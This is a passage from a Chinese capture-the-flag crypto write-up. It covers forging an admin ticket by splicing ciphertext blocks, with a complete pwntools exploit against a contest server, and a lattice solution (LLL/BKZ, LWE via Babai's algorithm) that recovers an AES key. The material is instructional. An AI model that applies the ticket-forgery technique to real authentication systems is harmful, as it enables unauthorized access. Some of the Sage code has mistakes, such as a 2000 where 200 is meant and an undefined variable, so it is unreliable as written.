数了一下位数，发现如果`Uid`部分填上5byte，`Username`部分填上`Administrator`，第一组刚好32bytes，那么可以继续在`Administrator`后填上1byte；这样，通过`uname == b"Administrator"`检测的同时，还能使得第一组密文所对应的明文为`Uid=?????\xffUserName=Administrator`，只要再去找到一个开头是`\xffT=...`第二组密文即可。利用同样的方法，稍微控制一下`T`的长度，也可以拿到`Cmd=Give_Me_Flag`的密文。

为此，构造了两组msg：

m1
- Uid: 10015
- Username: Administratorr
- Cmd: Give_Me_lag
- Appendix: fmyyfmyyfmyy

m2
- Uid: 10015
- Username: Bdministrator
- Cmd: Give_Me_F
- Appendix: aaaaaaaaaaaaaaa

那么`c1的第一组 + c2的第二组 + c1的第三组`就可以满足那2项要求。


```python
mm = b'Uid=10015\xffUserName=Administrator' + b'\xffT=5fdc5cf1b362311\xffCmd=Give_Me_F' + b'lag\xfffmyyfmyyfmyy'
m1 = b'Uid=10015\xffUserName=Administrator' + b'r\xffT=ab86207b745a777\xffCmd=Give_Me_' + b'lag\xfffmyyfmyyfmyy'
m2 = b'Uid=10015\xffUserName=Bdministrator' + b'\xffT=5fdc5cf1b362311\xffCmd=Give_Me_F' + b'\xffaaaaaaaaaaaaaaa'
```

构造auth：只需要让Sigma的最终值与`mm`的一样即可。
```python
# auth(mm) == auth(m3)
m3 = b'Uid=10014\xffUserName=Administrator' + b'r\xffT=ab86207b745a77\xffCmd=fmyyfmyyf' + b'jgg\xfffmyXbbe@Fq_Y'
```


![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/laG1dhPFj7oEC2n.png)


> 上图红色的密文即为我们解密用的ticket，auth可以通过构造m3得到。
>
> m3构造的时候，也可以选择不填充"fmyy"，填充一些其他东西，方便构造。

exp.py如下：
```python
import re
from hashlib import sha256
from itertools import product

from pwn import *


ALPHABET = string.ascii_letters + string.digits

def xor(a, b):
    return bytes(x^y for x,y in zip(a,b))


DEBUG = False
# context.log_level = "debug"
if DEBUG:
    r = remote("127.0.0.1", 45216)
else:
    r = remote('123.57.4.93', 45216)

# proof of work
rec = r.recvline().decode()
suffix = re.findall(r"\(XXXX\+b\'(.*?)\'", rec)[0]
digest = re.findall(r"== b\'(.*?)\'", rec)[0]
log.info(f"suffix: {suffix} \ndigest: {digest}")

log.info('Calculating hash...')
for i in product(ALPHABET, repeat=4):
    prefix = ''.join(i)
    guess = prefix + suffix
    if sha256(guess.encode()).hexdigest() == digest:
        log.info(f"Find XXXX: {prefix}")
        break
r.sendlineafter(b'Give me XXXX:', prefix.encode())

# m1
r.sendlineafter(b"Your option:", b"1")
r.sendlineafter(b"Set up your user id:", b"10015")
r.sendlineafter(b"Your username:", b"Administratorr")
r.sendlineafter(b"Your command:", b"Give_Me_lag")
r.sendlineafter(b"Any Appendix?", b"fmyy"*3)
r.recvuntil(b"Your ticket:")
c1 = r.recvline().strip()

# m2
r.sendlineafter(b"Your option:", b"1")
r.sendlineafter(b"Set up your user id:", b"10015")
r.sendlineafter(b"Your username:", b"Bdministrator")
r.sendlineafter(b"Your command:", b"Give_Me_F")
r.sendlineafter(b"Any Appendix?", b"a"*15)
r.recvuntil(b"Your ticket:")
c2 = r.recvline().strip()


ticket = c1[:64] + c2[64:128] + c1[128:]


# m3
r.sendlineafter(b"Your option:", b"1")
r.sendlineafter(b"Set up your user id:", b"10014")
r.sendlineafter(b"Your username:", b"Administratorr")
r.sendlineafter(b"Your command:", b"fmyyfmyyfjgg")
r.sendlineafter(b"Any Appendix?", b"fmyXbbe@Fq_Y")
r.recvuntil(b"With my Auth:")
auth = r.recvline().strip()

r.sendlineafter(b"Your option:", b"2")
r.sendlineafter(b"Ticket:", ticket)
r.sendlineafter(b"Auth:", auth)


r.interactive()
```

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/KIwudEOmYU5aeWq.jpg)

### diamond

题目分了3层。

- 首先是一个`320*5`的矩阵$A$，乘上了一个随机变换矩阵`5*7`的矩阵$R$，得到了一个`320*7`的矩阵$B$（不过数据给的是`7*320`的$B^T$

  ```python
  A = random_matrix(ZZ, 320, 5, x = 10, y = 1000)
  B = Matrix(A * vector([randint(1, 2^1024) for _ in range(5)]) for _ in range(7))
  ```

- 然后是一个LWE，生成了64组数据，$s \cdot A_{lwe}  + e = a$，没有直接给我们$A_{lwe}$和$a$。只给了$M = A_{lwe} \oplus A$，以及用$s$作为AES的key，对flag进行了加密。

  ```python
  L = LWE(n = 25, q = 1000, D = DGDIS(3))
  S = [L() for _ in range(64)]
  
  M = Matrix(64, 25, [int(i).__xor__(int(j)) for i,j in zip(A.list(), (Matrix([x for x, _ in S])).list())])
  ```

- 再就是一个knapsack problem，用长度为64的向量$a$与一个另外一个很大的长度为64的随机向量$T$相乘，得到一个很大的数$sum$。给了T以及$sum$。

  ```python
  T = Matrix([randint(1, 2^1024) for _ in range(64)])
  R = T.transpose().stack(T * vector([y for _, y in S]).change_ring(ZZ))
  ```

---

先来解决knapsack problem，虽然不是0-1 knapsack problem（也就是subset-sum problem），但由于$a$很小，所以还是可以用subset-sum problem的格子来解决这个问题。
$$
a_0 T_0 + a_1 T_1 + \cdots + a_{63}T_{63} = sum
$$
那么可以构造如下格子，显然$(a_0, a_1, \cdots, a_{63}, 0)$是这个格子上的一个格点，且很小，可用LLL规约出来。

![image-20201101232819224](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/joetNWLEkK4bYyD.png)

```python
T = [...]
L_knapsack = identity_matrix(64).stack(vector([0]*64)).augment(matrix(65, 1, T[:-1] + [-T[-1]]))
L_reduced = L_knapsack.LLL()
a = L_reduced[0][:-1]
print(a)
# (868, 798, 863, 260, 206, 550, 326, 908, 49, 50, 273, 528, 584, 569, 975, 261, 885, 680, 116, 33, 677, 664, 922, 178, 999, 336, 60, 655, 102, 438, 269, 754, 988, 124, 10, 380, 589, 382, 668, 623, 335, 845, 104, 117, 961, 917, 114, 590, 255, 26, 81, 846, 925, 548, 446, 796, 543, 997, 492, 651, 485, 137, 701, 247)
```

---

再来看一下如何恢复出LWE的$A_{lwe}$，想要恢复$A_{lwe}$，首先得知道$A$，然后跟$M$异或就行。所以现在的问题是：如何求$A$?

关于$A$，我们还知道另外一个条件是：
$$
A \cdot R = B
$$
但是，这个式子里面只有$B$是已知的。

两个矩阵$A, R$相乘得到$B$，仅从$B$反推出$A, R$，这真的可以么？？？

确实是可以的，可能这就是lattice的魅力所在。

为了方便叙述，对$A \cdot R = B$两边同时transpose一下，可以得到$R^T \cdot A^T = B^T$.

$A^T$是一个由`5 * 320`个非常小的元素（`10 <= x < 1000`）构成的矩阵，$R^T$是一个由`7 * 5`个非常大的元素（`1 <= x < 2^1024`）构成的矩阵；而$B^T$也是一个由`7 * 320`个非常大的元素构成的矩阵。

不难发现，$B^T$中的每一个行向量，都是$A^T$所有行向量的一个线性组合。也就是说$B^T$中的每一个行向量都在$A^T$所组成的格子中。我们只需要对$B^T$进行格基规约，就能找到$A^T$中的部分行向量（$A^T$中的行向量都非常小）。

通过各种方法，尝试对`7 * 320`的$B^T$进行规约，包括：使用LLL\BKZ算法、置换$B^T$中行向量的排序、修改算法的`delta`值。

```python
from tqdm import tqdm

B = [...]
BB = []
for i in range(0, len(B), 320):
    BB.append(B[i:i+320])
    
As = []
for i in tqdm(range(1000)):
    shuffle(BB)
    for line in matrix(len(BB), 320, BB).BKZ(delta=float(randint(75000, 99999)/100000)):
        if line[0] < 0:
            line = -line
        if line not in As and all(map(lambda x: 10 <= x <= 1000, line)):
            print(len(BB), line)
            As.append(line)
```

但是最后，都只能够得到4组行向量：

![image-20201101234726300](/Users/Soreat_u/Library/Application Support/typora-user-images/image-20201101234726300.png)

还有一个行向量，死活都整不出来。。。

有可能是这最后一个行向量的范数太小了，格基规约算法找不到这么小的。

所以，考虑了一下降维处理。

> 降维，只会减少到最后得到的LWE的组数，只要组数不是太小，LWE还是可以解出来的。

直接从320维降到了200维：

```python
from tqdm import tqdm

B = [...]
BB = []
for i in range(0, len(B), 320):
    BB.append(B[i:i+200])
    
As = []
for i in tqdm(range(1000)):
    shuffle(BB)
    for line in matrix(len(BB), 2000, BB).BKZ(delta=float(randint(75000, 99999)/100000)):
        if line[0] < 0:
            line = -line
        if line not in As and all(map(lambda x: 10 <= x <= 1000, line)):
            print(len(BB), line)
            As.append(line)
```

很快就能求出所有的$A^T$的5组行向量（虽然长度变短了一些）：

![image-20201101235130353](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/a7ICzi8MvQxUjAm.png)

有了这5组行向量，就可以得到`200 * 5`的$A$，用这`200 * 5`的$A$和$M$的前1000个元素异或即可得到$A_{lwe}$

> 这5组行向量的顺序是随机的，所以需要全排列一下，一共有$5!$种可能的$A_{lwe}$

```python
from itertools import permutations

MM = [...]

for p in permutations(As, int(5)):
    A = matrix(5, 200, p).transpose()
    A_LWE = Matrix(40, 25, [int(i).__xor__(int(j)) for i,j in zip(A.list(), MM)])
```

---

最后就是要解LWE。

LWE实际上跟GGH很类似，都是一个向量，经过矩阵变换后，加上了一些误差向量，得到一个结果向量；然后就很难反推回去。LWE与GGH不同的一点在于，GGH中的误差向量的选取是3或者-3，而LWE的误差向量则是一个满足正态分布的小向量。GGH正是因为只有3和-3，Nguyen直接对结果向量mod 6，就能得到明文的部分信息，进而将GGH所构造的CVP转化为了一个更容易解决的CVP。

LWE可以这么来理解：

![image-20201102000013793](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/s6JGkfF1olyVBrN.png)

如果这里不是“约等于”，而是“等于”，那么用高斯消元法可以很容易解出来。但正是因为加入了一些误差，如果使用高斯消元法的话，这些误差会聚集起来，使得解出来的东西跟实际值差很多。

也可以这么理解：
$$
s \cdot A  + e = a
$$
$A$是一个格子，然后这个格子基底的线性组合$b = A\cdot s$，是这个格子上的一个格点，然后这个格点$b$加上了一个误差向量$e$，得到了一个非格点$a$。LWE就是要我们找到离这个非格点$a$最近的一个格点，即CVP。

不过LWE的困难度被证明是基于最坏情况的SIVP困难度，属于CVP中比较难的问题。

> 更多有关内容，请看大佬的博客：http://blog.higashi.tech/

但是这题里面$s$的长度很小，只有25，所以这个LWE所对应的CVP问题是比较容易解决的（维度高了后，LWE就很难了）。

怎么解呢？

LWE的式子
$$
s_0 a_{i,0}  + s_1 a_{i,1}  + \cdots + s_{24} a_{i,24} \equiv a_i - e_i \pmod{p}
$$
可以化为：
$$
s_0 a_{i,0}  + s_1 a_{i,1}  + \cdots + s_{24} a_{i,24} + k_ip  + e_i = a_i
$$
那么可以构造矩阵$L$：

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/ndqmBJSQEiuVFYT.png)

先对矩阵$L$进行规约，得到一个good basis，再用Babai's algorithm求解CVP，即可得到离$a$最近的格点$b$。

然后，在$\bmod{1000}$的整数环里，解如下方程即可
$$
A_{lwe} \cdot s = b^{T}
$$

解出$s$后，对密文解密即可getflag：

```python
from itertools import permutations
from Crypto.Cipher import AES
from tqdm import tqdm
from hashlib import sha256

from sage.modules.free_module_integer import IntegerLattice



def BabaisClosestPlaneAlgorithm(L, w):
    '''
    Yet another method to solve apprCVP, using a given good basis.
    INPUT:
    * "L" -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice.
    * "w" -- a target vector to approach to.
    OUTPUT:
    * "v" -- a approximate closest vector.
    Quoted from "An Introduction to Mathematical Cryptography":
    In both theory and practice, Babai's closest plane algorithm
    seems to yield better results than Babai's closest vertex algorithm.
    '''
    G, _ = L.gram_schmidt()
    t = w
    i = L.nrows() - 1
    while i >= 0:
        w -= round( (w*G[i]) / G[i].norm()^2 ) * L[i]
        i -= 1
    return t - w


data = bytes.fromhex("c338be5406289b99332176593ae94b5e254df0e6b31b3155f370845e99d55f3a5b8b9e5576a126512b93eacacb6b7865f925120c3a221d0a2fcff362d841ad6be183a796f0c0a8111704737b6fc412f4")
iv, ct = data[:16], data[16:]

module = 1000
row = 40
column = 25

a = vector(ZZ, a[:40])
M = [...]

for p in permutations(As, int(5)):
    A = matrix(5, 200, p).transpose()
    A_LWE = Matrix(40, 25, [int(i).__xor__(int(j)) for i,j in zip(A.list(), M)])

    # solve LWE
    Lattice = matrix(ZZ, row + column, row)

    for i in range(row):
        for j in range(column):
            Lattice[row + j, i] = A_LWE[i][j]
        Lattice[i, i] = module

    lattice = IntegerLattice(Lattice, lll_reduce=True)
    target = vector(ZZ, LWE_c[:row])
    closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, a)
    
    e = closest_vector - a  # error vector
    print(e.norm()^2, e)
    
    A_LWE = matrix(Zmod(module), A_LWE)
    try:
        s = A_LWE.solve_right(closest_vector)
    except:
        print("no solution")
        continue
    
    # try decryption
    key = sha256(''.join(list(map(str, s))).encode()).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = cipher.decrypt(ct)
    print(pt)
    if b"NUCA" in pt:
        break
```

![image-20201102003415886](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/f3deGgyRopP6BaS.png)